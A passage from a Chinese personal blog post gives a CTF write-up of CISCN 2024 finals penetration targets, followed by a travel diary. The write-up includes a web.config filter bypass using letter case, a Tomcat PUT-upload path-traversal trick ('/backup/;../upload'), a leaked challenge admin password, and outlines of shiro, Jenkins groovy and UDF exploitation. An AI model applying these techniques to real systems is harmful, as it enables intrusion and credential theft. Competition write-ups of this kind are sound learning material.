        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接拉下第一个<code>git clone http://oauth2:&lt;API_TOKEN&gt;@192.168.8.42/vertexsoft/vertexsoftbackup.git</code>然后里面的backups.txt就是最后GitLab的flag</p>
<hr>
<h2 id="portal（Unsolved）"><a href="#portal（Unsolved）" class="headerlink" title="portal（Unsolved）"></a>portal（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这题是modbus monitor那个服务</p>
<p>随便注册一个用户发现需要admin才能查看某些信息，尝试直接抓包改传入的参数</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115531554.png" alt="image-20240721115531554"></p>
<p>User Management下有admin的详细信息</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115747461.png" alt="image-20240721115747461"></p>
<p><code>admin:A1m!n@Qsx1Jn</code></p>
<p>头像处有个文件上传的功能，但是没啥用</p>
<p>User List的左上角还有一个Export List的选项可以下载文件，存在任意文件下载</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721223030799.png" alt="image-20240721223030799"></p>
<p>测试发现web.config被ban了</p>
<p>赛后得知可以直接用<strong>大小写</strong>绕过来读取..&#x2F;web.config，从而得到mssql服务的密码（注意要用admin账号）</p>
<p>然后数据库连上去一把梭了（？</p>
<hr>
<h2 id="WIN-PC3788（Unsolved）"><a href="#WIN-PC3788（Unsolved）" class="headerlink" title="WIN-PC3788（Unsolved）"></a>WIN-PC3788（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Tomcat8.5.71，fuzz半天只有一个&#x2F;backup&#x2F;upload</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721232402649.png" alt="image-20240721232402649"></p>
<p>路径下只有index.jsp</p>
<p>赛后得知可以PUT文件上传，类似CVE-2017-12615：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p>
<p>但是upload目录不解析jsp，目录穿越到backup即可<code>/backup/;../upload</code></p>
<hr>
<h2 id="DC（Unsolved）"><a href="#DC（Unsolved）" class="headerlink" title="DC（Unsolved）"></a>DC（Unsolved）</h2><p>hint：In the real world, Control of RODC Active Directory Computer Object is dangerous</p>
<p><del>只要能拿下这2000分，一切都会好起来的</del></p>
<hr>
<h1 id="游记（？"><a href="#游记（？" class="headerlink" title="游记（？"></a>游记（？</h1><h2 id="day0"><a href="#day0" class="headerlink" title="day0"></a>day0</h2><p><del>（这个应该是day-1）</del>因为前一天去的机票和队友买的不是同一个时间段，导致自己一个人打车-坐动车-坐飞机-坐地铁-找酒店，最后晚上11点了才歇下来，不过成都的夜景还挺热闹的</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746386030.jpg" alt="1721746386030"></p>
<p>（你拍的什么🐕8，糊成这样）（（（</p>
<p>正式开始day0，去川大报道</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798383.jpg" alt="1721746798383"></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798391.jpg" alt="1721746798391"></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798375.jpg" alt="1721746798375"></p>
<p>校园很大，有一种刘姥姥进大观园的美，感觉像是学园都市（什 </p>
<p>最重要的是这里没有减速带！star在装减速带这方面遥遥领先了！（x</p>
<p>然后就是设备测试</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747099417.jpg" alt="1721747099417"></p>
<p>笑点解析：下面那个才是我的热点</p>
<p>唉柚子厨共用一个大脑（</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747257847.jpg" alt="1721747257847"></p>
<p>还是校内的大楼，感觉好高级，这就是985吗orz</p>
<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747447512.jpg" alt="1721747447512"></p>
<p>是 AWDP + 可信计算ctf</p>
<p>awdp一上来就看上了js，很快啊，ejs3.1.6，render方法，文件上传，欸这不就稳了吗</p>
<p>然后照着数字中国那题ssti来修这玩意，给定式思维害了，没注意到render方法里面需要传两个参数</p>
<p>直到第6轮的时候才凭借先知文库的找到正确的漏洞点并完成了fix，然后第8轮的时候才成功break，然后因为忙着补充wp细节还和三血失之交臂了555</p>
<p>最重要的是没注意到这个awdp的模式是n血分分数还会递减，会导致我们每一轮都比别人少加分</p>
<p>python那题本地环境起不来调试不了，感觉人都麻了</p>
<p>然后是去尝试fix SolonMaster，不幸地，我这阵子学的java里面刚好唯独没学fastjson，看到依赖里面有个fastjson的时候心凉了半截（</p>
<p>没办法只能硬给resolveClass加黑，但是我接触的java实在是太少了最终也没能修成</p>
<p>最后就默默吃分到了day1结束，还好js break得快能够扳回一城，不然便样衰了。。</p>
<p>3点结束回到酒店直接躺床上睡大觉zzz，队友倒是直接去玩了</p>
<p>晚上便是准备一点渗透相关的东西</p>
<h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p><del>你说得对，但今天是0721，中间忘了，因为今天就是这样的日子嘛.jpg</del></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240724000510733.png" alt="image-20240724000510733"></p>
<p>渗透 + 车联网&amp;工控</p>
<p>我自然是负责前者了</p>
<p>什么，我做内网代理，真的假的？</p>
<p>到了场地之后巨魔才发现没带拓展坞于是又回去拿，而我stowaway内网代理搞不明白卡了半天，然后erp又没学过，看着大伙一个个解出erp的时候确实有点急了</p>
<p>好在fscan扫出来的洞是heapdump泄露，此事在我的<a href="https://c1oudfl0w0.github.io/blog/2023/10/25/0xGameCTF-Week4/#spring-%E5%A4%8D%E7%8E%B0">0xgame week4</a>中亦有记载，运气也是挺好，接下来就是一个简单的shiro利用一把梭getshell，也算是赛棍魅力时刻（</p>
<p>然后做代理的事情全部交给巨魔了，巨魔那边不知道为什么vps总是掉线，没办法只能来我的电脑上操作chisel代理（怎么有人开了快十个终端一个个代理啊x</p>
<p>后面才想起来可以直接socks代理出去，问题不大</p>
<p>WIN-OPS88这里不知道为什么MDUT连不上去数据库，报jdbc的错误，问题不大，我直接把里面的udf.txt顷刻炼化，手动注入便是（</p>
<p>Jenkins因为rwctf的时候接触过一次，看到的时候还挺兴奋x，队友测出是弱密码进入，然后我这里利用本地的先知文库找到后台groovy命令执行的方法，成功拿下</p>
<p>可惜在上午解出三题之后我们便没有较大进展了，浪费不少时间在portal的任意文件读取上面，忘了Windows getshell之后可以尝试rbp远程连接导致RODC没出，后面很多队都只比我们多了100分，就是差在这里</p>
<p>一点半的时候我开始吃午饭，同时刷着先知文库寻找突破口，在最后十五分钟的时候突然发现gitlab好像是春秋云境的原题，但是Jenkins靶机响应慢如乌龟，拼尽全力也无法及时复现，又一次血亏😭</p>
<p>至于WIN-PC3788，有想过是PUT文件上传但感觉版本对不上于是没去实践😭</p>
<p>最终的成绩是国二，也是刷新了协会的历史记录</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721702570194.jpg" alt="1721702570194"></p>
<p>虽然还是有点遗憾，没能在最后两小时稳住优势，但是已经足够了，所谓的 True Ending 是大家在拼尽全力之后到达的，tql各位</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721750363736.jpg" alt="1721750363736"></p>
<p>好了，两天的985梦结束了，归来依旧是那个臭双非（</p>
<p>晚宴，菜是一盘接一盘的上，红不拉几的，不过还是吃了不少才回去，yysy川剧变脸和喷火很好看，晚宴的抽奖也是被挖出鉴权0day了（</p>
<h2 id="后日谈"><a href="#后日谈" class="headerlink" title="后日谈"></a>后日谈</h2><p>回到酒店还是睡觉，醒来也是慢悠悠的整理东西，仔细一想我好像除了比赛根本没出过门！有点后悔结束后的第二天早上没跟着Laffey去展子玩了（我嘞个漫展特种兵</p>
<p>然后在床上瘫了一早上belike</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751089662.jpg" alt="1721751089662"></p>
<p>回去的飞机上依旧是看番度过的</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277252.jpg" alt="1721751277252"></p>
<p>别在这里发电.jpg</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277246.jpg" alt="1721751277246"></p>
<p>可爱捏</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>